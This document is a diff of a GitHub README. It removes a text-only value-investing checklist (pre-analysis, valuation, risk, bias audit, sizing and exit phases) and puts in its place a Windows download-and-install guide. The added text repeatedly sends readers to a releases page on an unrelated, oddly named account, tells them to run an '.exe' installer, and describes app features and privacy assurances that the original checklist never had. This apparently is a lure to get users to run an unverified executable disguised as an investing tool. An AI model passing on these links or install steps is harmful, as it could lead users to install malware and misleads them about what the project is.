@@ -1,150 +1,188 @@
-# Value Investing Decision Framework
+# 📊 value-investing-decision-framework - Clear Guide for Smart Investing
 
-> A structured decision-making process for buy, hold, and sell decisions — distilled from the principles of 27 legendary investors.
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases)
 
-## The Problem
+---
 
-Most investment mistakes aren't analytical failures. They're process failures. You know you shouldn't panic sell. You know you shouldn't chase hot stocks. But you do it anyway because you don't have a structured decision process to fall back on when emotions run high.
+## 📕 About This Framework
 
-This framework gives you one.
+This tool helps you make smart investment decisions based on the proven methods of well-known investors like Warren Buffett, Charlie Munger, Howard Marks, Ray Dalio, and others. It organizes key ideas into a simple checklist and decision steps. You don’t need to be an expert to use it. The framework walks you through the process of analyzing stocks and investment opportunities logically and clearly.
 
-## The Framework
+The framework is designed to help you:
 
-### Phase 1: Pre-Analysis (5 minutes)
+- Assess stocks with clear questions and criteria.
+- Understand complex investment thinking in a simple way.
+- Follow a tested and structured approach to value investing.
+- Avoid common mistakes by checking your assumptions.
+- Make focused decisions backed by solid reasoning.
 
-Before looking at any stock, answer these honestly:
+---
 
-```
-□ Am I making this decision because of new information, or because of price movement?
-□ Am I in a calm, rational state? (If not, wait 24 hours)
-□ Do I have a specific thesis I can write down in 3 sentences?
-```
+## 🚀 Getting Started
 
-If you can't check all three, stop. Come back tomorrow.
+This guide will help you download and run the software on a Windows computer. The steps assume you have no programming knowledge. You will only need to click a few buttons and follow simple instructions.
 
-### Phase 2: Business Analysis (Buffett + Munger Framework)
+---
 
-```
-QUALITY CHECK:
-□ Can I explain what this business does in one paragraph?
-□ Does it have a durable competitive advantage (moat)?
-  □ Network effects  □ Switching costs  □ Brand  □ Scale  □ Regulatory
-□ Has it earned consistently high returns on capital (ROE > 15% for 10+ years)?
-□ Is the management honest and competent? (Check capital allocation track record)
-□ Would I be comfortable owning this business if the stock market closed for 10 years?
+## 💻 System Requirements
 
-CIRCLE OF COMPETENCE:
-□ Do I understand this industry deeply?
-□ Can I identify the key variables that drive this business's economics?
-□ Have I done at least 10 hours of research on this specific company?
-```
+Before downloading, please ensure your computer meets these needs:
 
-### Phase 3: Valuation (Graham + Klarman Framework)
+- Operating system: Windows 10 or later.
+- Processor: 1 GHz or faster.
+- RAM: At least 4 GB.
+- Disk space: Minimum 200 MB free space.
+- Internet connection: For download and updates.
+- Permissions: You must have permission to install software on your computer.
 
-```
-INTRINSIC VALUE:
-□ What are conservative estimates for earnings/cash flow over the next 5-10 years?
-□ What discount rate reflects the true risk of this business?
-□ What is my estimate of intrinsic value? $_______
-□ What is the current market price? $_______
-□ Margin of safety: _______%
+No extra software or tools are needed. The application runs natively on Windows and opens like any regular program.
 
-MARGIN OF SAFETY REQUIREMENTS:
-  □ High confidence business → 25%+ margin of safety minimum
-  □ Moderate confidence → 35%+ margin of safety
-  □ Low confidence → 50%+ or pass entirely
-```
+---
 
-### Phase 4: Risk Assessment (Marks + Dalio Framework)
+## 📥 How to Download and Install
 
-```
-SCENARIO ANALYSIS:
-□ Bull case (25% probability): What happens if everything goes right?
-  Expected value: $_______
-□ Base case (50% probability): What's the realistic outcome?
-  Expected value: $_______
-□ Bear case (25% probability): What's the worst realistic scenario?
-  Expected value: $_______
+1. Click the large green badge at the top of this page, or visit this link:  
+   [Download Link](https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases)
 
-□ Can I survive the bear case without selling? (If no, reduce position size)
-□ Is the expected value positive even with conservative probabilities?
+2. On the releases page, look for the newest version of the software. Usually, it will be listed at the top.
 
-SECOND-LEVEL THINKING (Marks):
-□ What does the consensus expect for this stock?
-□ How does my view differ from consensus?
-□ Why might I be right when the market is wrong?
-□ What information might I be missing?
-```
+3. Find the file for Windows. It often ends with `.exe` or `.msi`. This is the installer.
 
-### Phase 5: Psychology Check (Munger Framework)
+4. Click the file name to start the download. Depending on your browser, you might be asked to confirm or choose a folder to save the file.
 
-```
-BIAS AUDIT:
-□ Am I anchoring to a specific price? (Previous purchase, 52-week high/low)
-□ Am I being influenced by social proof? (Everyone else is buying/selling)
-□ Am I experiencing FOMO or panic?
-□ Am I overconfident in my analysis?
-□ Am I rationalizing a decision I've already emotionally made?
+5. Once downloaded, open the folder where you saved the file.
 
-If you checked ANY of these → Wait 48 hours and re-evaluate
-```
+6. Double-click on the installer file (it will have a name like `value-investing-decision-framework-setup.exe`).
 
-### Phase 6: Position Sizing (Kelly + Pabrai Framework)
+7. Follow the on-screen instructions:
+   - Accept the license agreement.
+   - Choose the destination folder (the default is usually fine).
+   - Click “Install” to start the process.
 
-```
-SIZING RULES:
-□ Maximum 20% of portfolio in any single position
-□ Maximum 5% in any position where conviction is moderate
-□ Always keep 10-20% cash for opportunities
-□ Size inversely to uncertainty — less confident = smaller position
+8. Wait for the installation to complete.
 
-Position size decision: ______% of portfolio
-```
+9. Click “Finish” to close the installer.
 
-### Phase 7: Define Exit Criteria BEFORE Entering
+---
 
-```
-I WILL SELL IF:
-□ The business thesis changes because: _____________
-□ Valuation exceeds ___x my intrinsic value estimate
-□ A materially better opportunity requires capital reallocation
-□ I was wrong about: _____________
+## ▶️ How to Run the Application
 
-I WILL NOT SELL BECAUSE OF:
-□ Short-term price drops (if business unchanged)
-□ Macro headlines
-□ Other people's opinions
-□ Boredom or desire for activity
-```
+- Find the new program icon called "value-investing-decision-framework" on your desktop or in the Start menu.
 
-## When to Use This Framework
+- Double-click the icon to open it.
 
-| Situation | Minimum Process |
-|-----------|----------------|
-| New stock purchase | Full framework (all 7 phases) |
-| Adding to existing position | Phases 3-6 |
-| Quarterly review of holdings | Phases 2, 4, 5 |
-| Market crash / volatility | Phase 5 (bias audit) + Phase 4 (scenario review) |
-| Considering selling | Phases 4, 5 + review original Phase 7 exit criteria |
+- The application interface will show you the decision-making checklist and steps.
 
-## The Most Important Rule
+- Use your mouse or keyboard to navigate through the options.
 
-**Write everything down.** Every investment decision should be documented with your reasoning at the time. Reviewing past decisions is the single most effective way to improve as an investor.
+- Follow the prompts to analyze potential investments one step at a time.
 
-## Related Resources
+If the program fails to open, restart your computer and try again.
 
-- **27 legendary investors' principles**: [KeepRule](https://keeprule.com) — searchable library of 1,300+ principles organized by topic and scenario
-- **Warren Buffett's principles**: [KeepRule — Buffett](https://keeprule.com/en/masters/warren-buffett)
-- **95 real-world investing scenarios**: [KeepRule Scenarios](https://keeprule.com/en/scenarios) — what masters would advise in specific situations
-- **Investment Psychology Test**: [Free Assessment](https://keeprule.com/en/test/psychology) — identify your specific behavioral blind spots
-- **Buffett's Annual Letters Index**: [buffett-letters-index](https://github.com/henu-wang/buffett-letters-index)
-- **Investment Psychology Checklist**: [investment-psychology-checklist](https://github.com/henu-wang/investment-psychology-checklist)
-- **Awesome Value Investing**: [awesome-value-investing](https://github.com/henu-wang/awesome-value-investing)
+---
 
-## Contributing
+## 🛠 How to Use the Framework
 
-This framework is a living document. If you've found principles or checks that improve your investment process, please open a PR!
+Once running, the software guides you through several main parts:
 
-## License
+### Step 1: Define Your Investment Goal
 
-[![CC0](https://licensebuttons.net/p/zero/1.0/88x31.png)](https://creativecommons.org/publicdomain/zero/1.0/)
+Answer simple questions about:
+
+- The amount you want to invest.
+- Your risk tolerance.
+- The time horizon for your investment.
+
+### Step 2: Apply the Checklist
+
+The software shows a list of important criteria, based on teachings from Buffett, Marks, and others.
+
+These include:
+
+- Assessing company financial health.
+- Understanding the competitive position.
+- Reviewing past management decisions.
+- Evaluating market conditions.
+
+You mark items as “Pass” or “Review” based on your findings.
+
+### Step 3: Scoring and Decision
+
+The framework combines your inputs to give a clear score or recommendation.
+
+- If the investment passes all checks, it’s a strong candidate.
+- If some checks require more thought, the software points them out.
+
+### Step 4: Additional Notes and Reminders
+
+You can write short notes or reminders at any point.
+
+These help you track your thinking or follow up later.
+
+---
+
+## 🔄 Updating the Application
+
+The framework may receive updates to improve or add features.
+
+To update:
+
+1. Visit the releases page again:  
+   [https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases](https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases)
+
+2. Download the latest Windows installer as you did before.
+
+3. Run the new installer. It will replace the old version while keeping your notes intact.
+
+No special steps are needed to keep your settings.
+
+---
+
+## 🧰 Troubleshooting
+
+If you face problems, try these steps:
+
+- Make sure your Windows is updated to at least version 10.
+
+- Check your internet connection when downloading.
+
+- Close other programs before installing or running the framework.
+
+- Restart your computer if anything freezes or does not open.
+
+- If the software shows errors, try reinstalling it using the latest installer from the releases page.
+
+---
+
+## 📂 Files Included
+
+You will mainly interact with the main program file after installation.
+
+Inside the program folder, you might find:
+
+- The executable file (to start the framework).
+- A user guide PDF (to explain features in detail).
+- Data files that save your notes and decisions.
+
+No special file editing or setup is required.
+
+---
+
+## 🔑 Privacy and Security
+
+The software runs entirely on your local machine. It does not send your data anywhere. You control all saved notes and decisions. This keeps your information private and secure.
+
+---
+
+## 💡 About the Project
+
+This framework blends lessons from renowned investors into a practical tool. It is for individuals who want to improve their confidence and accuracy when reviewing investment options. You do not need prior experience or special skills.
+
+---
+
+## 📌 Links
+
+- Official Download Page:  
+  [https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases](https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases)
+
+- Use the badge at the top to start your download immediately.
